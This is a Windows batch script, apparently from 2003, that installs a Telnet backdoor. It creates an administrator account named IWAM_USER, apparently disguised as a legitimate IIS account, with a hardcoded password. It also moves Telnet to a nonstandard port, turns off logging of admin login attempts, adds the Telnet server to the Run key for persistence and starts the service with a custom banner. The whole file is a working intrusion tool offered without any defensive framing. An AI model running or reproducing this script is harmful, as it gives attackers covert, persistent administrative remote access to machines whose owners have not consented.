net localgroup TelnetClients /add
net user IWAM_USER her0in /add
net localgroup Administrators IWAM_USER /add
net localgroup TelnetClients IWAM_USER /add
CD /D %windir%\system32
ECHO Windows Registry Editor Version 5.00>tmp.reg
ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\TelnetServer\1.0]>>tmp.reg
ECHO "TelnetPort"=dword:000003ff>>tmp.reg
ECHO "LogAdminAttempts"=dword:00000000>>tmp.reg
ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]>>tmp.reg
ECHO "Telnet"="C:\WINDOWS\System32\tlntsvr.exe">>tmp.reg
regedit /s tmp.reg
DEL tmp.reg
ECHO ECHO.>login.cmd
ECHO ECHO        *****************************************************************>>login.cmd
ECHO ECHO.>>login.cmd
ECHO ECHO                       WELCOME TO HEROIN`s TELNET SERVICE           >>login.cmd
ECHO ECHO                heroin@mol.mn http://protoculture.tk 17.Juni 2003   >>login.cmd
ECHO ECHO.>>login.cmd
ECHO ECHO        *****************************************************************>>login.cmd
ECHO CD \>>login.cmd
ECHO prompt %computername%:$P$G>>login.cmd
NET START TELNET